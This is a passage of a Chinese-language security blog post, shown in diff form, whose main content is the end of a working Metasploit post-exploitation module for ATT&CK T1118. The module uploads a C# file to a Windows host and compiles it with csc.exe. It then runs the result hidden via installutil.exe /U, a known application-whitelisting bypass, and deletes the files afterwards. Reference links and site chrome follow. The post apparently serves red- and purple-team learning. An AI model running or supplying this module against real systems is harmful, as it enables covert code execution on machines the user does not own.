[ <span class="string">'URL'</span>, <span class="string">'https://attack.mitre.org/wiki/Technique/T1118'</span> ],</span><br><span class="line">                        [ <span class="string">'URL'</span>, <span class="string">'https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1118'</span> ],</span><br><span class="line">                        [ <span class="string">'URL'</span>, <span class="string">'https://gist.github.com/lithackr/b692378825e15bfad42f78756a5a3260'</span>  ],</span><br><span class="line">                        [ <span class="string">'URL'</span>, <span class="string">'https://github.com/praetorian-code/purple-team-attack-automation/blob/master/modules/post/windows/purple/t1118.rb'</span> ] ],</span><br><span class="line">                        <span class="string">'Platform'</span>      =&gt; [ <span class="string">'win'</span> ],</span><br><span class="line">                        <span class="string">'SessionTypes'</span>  =&gt; [ <span class="string">'meterpreter'</span> ]</span><br><span class="line">                       ))</span><br><span class="line">      register_options(</span><br><span class="line">      [</span><br><span class="line">        OptString.new( <span class="string">'RFILE'</span>, [<span class="literal">false</span>, <span class="string">'上传到windows路径'</span>,<span class="string">'C:\\windows\\temp\\t1118.tmp'</span> ]),</span><br><span class="line">        OptString.new(<span class="string">'LFILE'</span>, [ <span class="literal">true</span>, <span class="string">'本地t1118.cs路径'</span>, <span class="symbol">:</span><span class="symbol">:File</span>.join(Msf::Config.install_root, <span class="string">"data"</span>, <span class="string">"tianyu"</span>, <span class="string">"t1118"</span>, <span class="string">"t1118.cs"</span>) ]),</span><br><span class="line">        OptBool.new(<span class="string">'CLEANUP_FILE'</span>, [ <span class="literal">true</span>, <span class="string">"清理文件"</span>, <span class="literal">true</span>]),</span><br><span class="line">        OptString.new(<span class="string">'DOTNET_VERSION'</span>, [<span class="literal">true</span>, <span class="string">'DotNet Version'</span>,<span class="string">'v4.0.30319'</span> ]),</span><br><span class="line">      ])</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#上传文件</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">remote_file</span></span></span><br><span class="line">        <span class="keyword">if</span> datastore[<span class="string">'RFILE'</span>].blank?</span><br><span class="line">          remote_name = File.basename(datastore[<span class="string">'LFILE'</span>])</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          remote_name = datastore[<span class="string">'RFILE'</span>]</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    </span><br><span class="line">        remote_name</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#本地文件</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">local_file</span></span></span><br><span class="line">          datastore[<span class="string">'LFILE'</span>]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#清理文件</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">clean_file</span></span></span><br><span class="line">          print_status(<span class="string">"Removing files..."</span>)</span><br><span class="line">          register_file_for_cleanup(datastore[<span class="string">'RFILE'</span>])</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#运行cmd 命令</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run_cmd</span><span class="params">(user_cmd,io=<span class="literal">true</span>)</span></span></span><br><span class="line">        cmd = <span class="string">"cmd /c <span class="subst">#&#123;user_cmd&#125;</span>"</span></span><br><span class="line">        <span class="keyword">begin</span></span><br><span class="line">          print_status(<span class="string">"Executing '<span class="subst">#&#123;cmd&#125;</span>' on <span class="subst">#&#123;session.inspect&#125;</span>"</span>)</span><br><span class="line">          <span class="keyword">if</span> io</span><br><span class="line">            res = cmd_exec(cmd)</span><br><span class="line">            <span class="keyword">if</span> res</span><br><span class="line">              print_warning(res)</span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            res = session.sys.process.execute(cmd, <span class="literal">nil</span>, &#123;<span class="string">'Hidden'</span> =&gt; <span class="literal">true</span>&#125;)</span><br><span class="line">          <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">rescue</span> <span class="symbol">:</span><span class="symbol">:Exception</span> =&gt; e</span><br><span class="line">          print_error(<span class="string">"Unable to execute: <span class="subst">#&#123;e.message&#125;</span>"</span>)</span><br><span class="line">          <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span></span></span><br><span class="line">        <span class="keyword">begin</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span> <span class="keyword">if</span> session.type != <span class="string">"meterpreter"</span></span><br><span class="line">            rfile = remote_file()</span><br><span class="line">            lfile = local_file()</span><br><span class="line">            dotnet_version = datastore[<span class="string">'DOTNET_VERSION'</span>]</span><br><span class="line">            base = <span class="string">'C:\Windows\Microsoft.NET\Framework'</span></span><br><span class="line">          </span><br><span class="line">            csc = base + <span class="string">'\\'</span> + dotnet_version + <span class="string">'\\'</span> + <span class="string">'csc.exe'</span></span><br><span class="line">            installutil = base + <span class="string">'\\'</span> + dotnet_version + <span class="string">'\\'</span> + <span class="string">'installutil.exe'</span></span><br><span class="line"></span><br><span class="line">            upload_file(rfile, lfile)</span><br><span class="line">            cmd = <span class="string">%Q(<span class="subst">#&#123;csc&#125;</span> /out:C:\\windows\\temp\\t1118.dll <span class="subst">#&#123;rfile&#125;</span>)</span></span><br><span class="line">            print_status(<span class="string">"Compiling..."</span>)</span><br><span class="line">            run_cmd(cmd)</span><br><span class="line">            sleep(<span class="number">2</span>)</span><br><span class="line">            cmd = <span class="string">%Q(<span class="subst">#&#123;installutil&#125;</span> /logfile= /LogToConsole=false /U C:\\windows\\temp\\t1118.dll")</span></span><br><span class="line">            print_status(<span class="string">"Executing InstallUtil..."</span>)</span><br><span class="line">            run_cmd(cmd,<span class="literal">false</span>)</span><br><span class="line">            print_good(<span class="string">"模块T1118执行成功"</span>)</span><br><span class="line">            sleep(<span class="number">2</span>)</span><br><span class="line">            clean_file()</span><br><span class="line">            print_good(<span class="string">"清理缓存成功"</span>)</span><br><span class="line">        <span class="keyword">rescue</span> <span class="symbol">:</span><span class="symbol">:Exception</span> =&gt; e</span><br><span class="line">            print_status(<span class="string">"Unable to execute: <span class="subst">#&#123;e.message&#125;</span>"</span>)</span><br><span class="line">            print_error(<span class="string">"模块T1118执行失败"</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+<p><strong>参考链接：</strong></p>
+<p> <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.004/T1218.004.md#atomic-test-7---installutil-helptext-method-call" target="_blank" rel="noopener">https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.004/T1218.004.md#atomic-test-7---installutil-helptext-method-call</a> </p>
+<p> <a href="https://attack.mitre.org/techniques/T1218/004/" target="_blank" rel="noopener">https://attack.mitre.org/techniques/T1218/004/</a> </p>
+<p><a href="https://github.com/praetorian-code/purple-team-attack-automation/blob/master/modules/post/windows/purple/t1118.rb" target="_blank" rel="noopener">https://github.com/praetorian-code/purple-team-attack-automation/blob/master/modules/post/windows/purple/t1118.rb</a></p>
+</span>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Metasploit/" rel="tag">#Metasploit</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/jishu.html" rel="prev">即刻安全纯技术交流群</a>
+            
+</div>
+
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/APT污水攻击MuddyC3 1.1.1版本浅析.html" rel="next">APT污水攻击MuddyC3 1.1.1版本浅析</a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div>
+      
+        <style type="text/css">
+
+    .donate_bar {
+        text-align: center;
+        margin-top : 5%;
+    }
+
+    .donate_bar.hidden {
+        display:none;
+    }
+/*
+    .donate_bar a.btn_donate {
+        display: inline-block;
+        width: 82px;
+        height: 82px;
+        margin-left:auto;
+        margin-right:auto;
+
+        background: url("http://img.t.sinajs.cn/t5/style/images/apps_PRF/e_media/btn_reward.gif") no-repeat;
+        _background: url("http://img.t.sinajs.cn/t5/style/images/apps_PRF/e_media/btn_reward.gif") no-repeat; 
+
+        -webkit-transition: background 0s;
+        -moz-transition: background 0s;
+        -o-transition: background 0s;
+        -ms-transition: background 0s;
+        transition: background 0s;
+    }
+*/
+    .donate_bar a.btn_donate:hover { 
+        // background-position: 0px -82px;
+        color: #87daff
+    }
+
+    .donate_bar .donate_txt {
+        display: block;
+        color: #9d9d9d;
+        font: 14px/2 "Microsoft Yahei";
+    }
+
+    .bold { 
+        font-weight: bold; 
+    }
+
+    .post-donate a {
+        border-bottom: 0px;
+    }
+
+    #donate_guide table {
+        border: none;
+    }
+
+    #donate_guide td {
+        border-bottom: none;
+        border-right: none;
+        background: #333333;
+        valign: top;
+    }
+
+</style>
+
+
+
+    
+
+    <div class="post-donate">
+        <div id="donate_board" class="donate_bar center">
+              <a id="btn_donate" class="btn_donate" href="javascript:;" title="打赏">赏</a>
+              <span id="donate_txt" class="donate_txt">
+                   
+                        欢迎加入即刻安全和低调群
+                   
+              </span>
+            <br>
+        </div>  
+  
+        <div id="donate_guide" class="donate_bar center hidden">
+            <!--
+            
+                <a href="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715250891.jpg" title="支付宝打赏" class="fancybox" rel="article0" 
+                    style="float:left;margin-left:25%;margin-right:10px;">
+                    <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715250891.jpg" title="" height="164px" width="164px">
+                </a> 
+              
+
+            
+                <a href="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715240236.jpg" title="微信打赏" class="fancybox" rel="article0"
+                    style="margin-right:30%">
+                    <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715240236.jpg" title="" height="164px" width="164px">
+                </a>
+            
+            -->
+            <table>
+                <tr>
+                    <td>
+                        
+                            <a href="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715250891.jpg" title="支付宝打赏" class="fancybox" rel="article0" style="float:left;margin-left:25%;margin-right:10px;">
+                                <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715250891.jpg" title height="164px" width="164px">
+                            </a> 
+                         
+                    </td>
+                    <td>
+                        
+                            <a href="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715240236.jpg" title="微信打赏" class="fancybox" rel="article0" style="margin-right:30%">
+                                <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715240236.jpg" title height="164px" width="164px">
+                            </a>
+                        
+                    </td>
+                </tr>
+            </table>
+
+        </div>
+
+        <script type="text/javascript">
+            document.getElementById('btn_donate').onclick = function() {
+                $('#donate_board').addClass('hidden');
+                // $('#donate_guide').removeClass('hidden');
+                $('#donate_guide').show(2000);
+            }
+
+        </script>
+    </div>
+
+    
+
+
+      
+    </div>
+
+    <div class="post-spread">
+      
+        <div class="bdsharebuttonbox">
+	<a href="#" class="bds_more" data-cmd="more"></a>
+	<a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+	<a href="#" class="bds_tqq" data-cmd="tqq" title="分享到腾讯微博"></a>
+	<a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+</div>
+<script>
+    window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"1","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+      
+    </div>
+  </div>
+
+ </div>
+
+        
+
+        
+          <div class="comments" id="comments">
+            
+              <div class="ds-thread" data-thread-key="metasploit后渗透模块编写ATT&CK-T1118.html" data-title="Metasploit后渗透模块编写ATT&CK-T1118" data-url="www.ggsec.cn/metasploit后渗透模块编写ATT&CK-T1118.html">
+              </div>
+            
+          </div>
+        
+      </div>
+
+      
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" src="/images/default_avatar.jpg" alt="Demon‘blog | 没有绝对安全的系统" itemprop="image">
+          <p class="site-author-name" itemprop="name">Demon‘blog | 没有绝对安全的系统</p>
+        </div>
+        <p class="site-description motion-element" itemprop="description">kali|linux|sec|Web|MSF|Win</p>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">171</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          <div class="site-state-item site-state-categories">
+            
+              <span class="site-state-item-count">9</span>
+              <span class="site-state-item-name">分类</span>
+              
+          </div>
+
+          <div class="site-state-item site-state-tags">
+            <a href="/tags">
+              <span class="site-state-item-count">16</span>
+              <span class="site-state-item-name">标签</span>
+              </a>
+          </div>
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="menu-item-icon icon-next-feed"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="http://www.secist.com" target="_blank">即刻安全</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.airs-sec.com" target="_blank">小城工作室</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://linux.dog" target="_blank">泡泡博客</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://www.webshell.ren" target="_blank">THE博客</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://isbase.cc/" target="_blank">zusheng</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/demonsec666" target="_blank">Demon(Github)</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.inksec.cn" target="_blank">Szrzvdny</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.xsafe.org/" target="_blank">xsafe</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.sqlsec.com" target="_blank">国光</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://droidkali.github.io" target="_blank">记忆纯真</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.frostsaber.com/" target="_blank">FrostsaberX 's Blog</a>
+              </span>
+            
+          
+        </div>
+<div class="links-of-friendly motion-element">
+          
+        </div>
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator"></div>
+          <div class="post-toc">
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-T1118"><span class="nav-number">1.</span> <span class="nav-text">1.T1118</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-T1118-POC"><span class="nav-number">2.</span> <span class="nav-text">2.T1118-POC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-开始编写模块"><span class="nav-number">3.</span> <span class="nav-text">3.开始编写模块</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-初始化模块"><span class="nav-number">3.1.</span> <span class="nav-text">3.1 初始化模块</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-定义本地文件和上传文件"><span class="nav-number">3.2.</span> <span class="nav-text">3.2  定义本地文件和上传文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-删除上传的源代码"><span class="nav-number">3.3.</span> <span class="nav-text">3.3 删除上传的源代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3定义cmd的命令"><span class="nav-number">3.4.</span> <span class="nav-text">3.3定义cmd的命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-4上传文件和命令执行"><span class="nav-number">3.5.</span> <span class="nav-text">3.4上传文件和命令执行</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-完整代码"><span class="nav-number">4.</span> <span class="nav-text">4.完整代码</span></a></li></ol></div>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator"></div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner"> <div class="copyright">
+  
+  &copy; &nbsp; 
+  <span itemprop="copyrightYear">2020
+  </span>
+  <span class="with-love">
+    <i class="icon-next-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Demon‘blog | 没有绝对安全的系统
+  </span>
+</div>
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="http://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme by <a class="theme-link" href="http://blog.idhyt.com">idhyt</a>.<a class="theme-link" href="https://github.com/idhyt/hexo-theme-next/tree/magiclamp">Mala</a>
+</div>
+
+<!-- busuanzi -->
+
+  <div class="busuanzi-info">
+    <div class="theme-info">
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+    </script>
+    <span id="busuanzi_container_site_pv">
+        本站总访问量<a class="theme-link"><span id="busuanzi_value_site_pv"></span></a>次 |
+	本站访客数<span id="busuanzi_value_site_uv"></span>人次
+    </span>
+</div>
+
+  </div>
+
+
+
+ </div>
+    </footer>
+
+    <div class="back-to-top"></div>
+  </div>
+
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+  
+    
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"demonsec"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+    
+
+    
+  
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.5.1"></script>
+
+
+  <script type="text/javascript" src="/js/helpers.js?v=0.4.5.1"></script>
+  
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" src="/js/motion_global.js?v=0.4.5.1" id="motion.global"></script>
+
+
+
+
+  <script type="text/javascript" src="/js/nav-toggle.js?v=0.4.5.1"></script>
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  
+<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.5.1" id="bootstrap.scrollspy.custom"></script>
+
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.motion.complete', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      var $indicator = $(indicator);
+      var opacity = action === 'show' ? 0.4 : 0;
+      $indicator.velocity ?
+        $indicator.velocity('stop').velocity({
+          opacity: opacity
+        }, { duration: 100 }) :
+        $indicator.stop().animate({
+          opacity: opacity
+        }, 100);
+    }
+
+  });
+</script>
+
+<script type="text/javascript" id="sidebar.nav">
+  $(document).ready(function () {
+    var html = $('html');
+    var TAB_ANIMATE_DURATION = 200;
+    var hasVelocity = $.isFunction(html.velocity);
+
+    $('.sidebar-nav li').on('click', function () {
+      var item = $(this);
+      var activeTabClassName = 'sidebar-nav-active';
+      var activePanelClassName = 'sidebar-panel-active';
+      if (item.hasClass(activeTabClassName)) {
+        return;
+      }
+
+      var currentTarget = $('.' + activePanelClassName);
+      var target = $('.' + item.data('target'));
+
+      hasVelocity ?
+        currentTarget.velocity('transition.slideUpOut', TAB_ANIMATE_DURATION, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', TAB_ANIMATE_DURATION)
+            .addClass(activePanelClassName);
+        }) :
+        currentTarget.animate({ opacity: 0 }, TAB_ANIMATE_DURATION, function () {
+          currentTarget.hide();
+          target
+            .stop()
+            .css({'opacity': 0, 'display': 'block'})
+            .animate({ opacity: 1 }, TAB_ANIMATE_DURATION, function () {
+              currentTarget.removeClass(activePanelClassName);
+              target.addClass(activePanelClassName);
+            });
+        });
+
+      item.siblings().removeClass(activeTabClassName);
+      item.addClass(activeTabClassName);
+    });
+
+    $('.post-toc a').on('click', function (e) {
+      e.preventDefault();
+      var targetSelector = escapeSelector(this.getAttribute('href'));
+      var offset = $(targetSelector).offset().top;
+      hasVelocity ?
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        }) :
+        $('html, body').stop().animate({
+          scrollTop: offset
+        }, 500);
+    });
+
+    // Expand sidebar on post detail page by default, when post has a toc.
+    var $tocContent = $('.post-toc-content');
+    if (isDesktop() && CONFIG.sidebar === 'post') {
+      if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
+        displaySidebar();
+      }
+    }
+  });
+</script>
+
+
+
+  <script type="text/javascript">
+    $(document).ready(function () {
+      if (CONFIG.sidebar === 'always') {
+        displaySidebar();
+      }
+      if (isMobile()) {
+        FastClick.attach(document.body);
+      }
+    });
+  </script>
+
+  
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/lazyload.js"></script>
+  <script type="text/javascript">
+    $(function () {
+      $("#posts").find('img').lazyload({
+        placeholder: "/images/loading.gif",
+        effect: "fadeIn"
+      });
+    });
+  </script>
+</body>
+</html>
